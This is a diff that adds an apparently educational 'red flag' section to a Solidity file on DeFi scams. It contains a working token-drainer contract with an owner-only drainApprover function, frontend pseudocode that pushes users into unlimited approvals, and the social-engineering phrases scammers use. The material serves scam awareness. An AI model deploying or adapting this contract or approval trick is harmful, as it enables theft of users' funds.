@@ -156,6 +156,81 @@ contract MaliciousBatchSend {
 }
 
 // =====================================================================
+//   🚩 RED FLAG #5 — FORCED APPROVAL ("you must approve to send")
+// =====================================================================
+// The scammer's dApp UI refuses to let the user send anything until
+// they sign an UNLIMITED approval. Common social-engineering scripts:
+//
+//   - "One-time setup required to enable sending"
+//   - "Initialize your account before first transfer"
+//   - "Unlock the send feature (gas optimization)"
+//   - "Verify wallet ownership before sending"
+//
+// NONE of these are real things. Sending USDT person-to-person needs
+// zero approvals — it's just `USDT.transfer(recipient, amount)` signed
+// by the sender. Any dApp that demands approval before a basic send
+// is laying a drain trap.
+//
+// The cruelest part: the first send the user makes through this
+// contract ACTUALLY WORKS. Recipient really receives the tokens. So
+// the user thinks the dApp is legit and comes back to send more.
+// Meanwhile, the unlimited approval is sitting there waiting for the
+// owner to call `emergencyWithdraw` or `execute` (Red Flags #1 & #2).
+//
+// On-chain side of the scam below; the frontend trick is in JS.
+
+contract MaliciousForcedApproval {
+    address public owner;
+    address public defaultToken; // USDT
+
+    constructor(address _token) {
+        owner = msg.sender;
+        defaultToken = _token;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
+    }
+
+    /// The "send" function the frontend calls. Looks like a friendly
+    /// wrapper for USDT.transfer. The hidden requirement is that the
+    /// user must have approved this contract for >= the send amount
+    /// (the frontend always asks for MAX approval "to save gas").
+    ///
+    /// Once approved, the contract's `transferFrom` works forever —
+    /// not just for this send, but for every future call by the owner.
+    function send(address to, uint256 amount) external {
+        // Pulls from msg.sender via the pre-existing approval.
+        // First call works fine — recipient gets the tokens.
+        // The approval that made it work is the loaded gun.
+        IERC20(defaultToken).transferFrom(msg.sender, to, amount);
+    }
+
+    /// The harvest function — same as Red Flag #1. The forced approval
+    /// above is what makes this work on every "user" of the dApp.
+    function drainApprover(address victim) external onlyOwner {
+        uint256 bal = IERC20(defaultToken).balanceOf(victim);
+        IERC20(defaultToken).transferFrom(victim, owner, bal);
+    }
+}
+
+// Frontend tell (pseudocode the scammer ships with the above contract):
+//
+//   async function sendUSDT(to, amount) {
+//     const allowance = await usdt.allowance(user, scamContract);
+//     if (allowance < MAX_UINT256) {
+//       alert("First-time setup — please approve to enable sending");
+//       await usdt.approve(scamContract, MAX_UINT256);   // ← THE TRAP
+//     }
+//     await scamContract.send(to, amount);                // ← works! user trusts
+//   }
+//
+// If your wallet ever shows an `Approve` popup when you expected
+// `Transfer` — REJECT it. That mismatch is the single clearest scam
+// signal in all of DeFi.
+
+// =====================================================================
 //   ✅ SAFE REFERENCE — what a real "rescue" function should look like
 // =====================================================================
 // If a contract genuinely needs to recover stuck tokens, the rescue
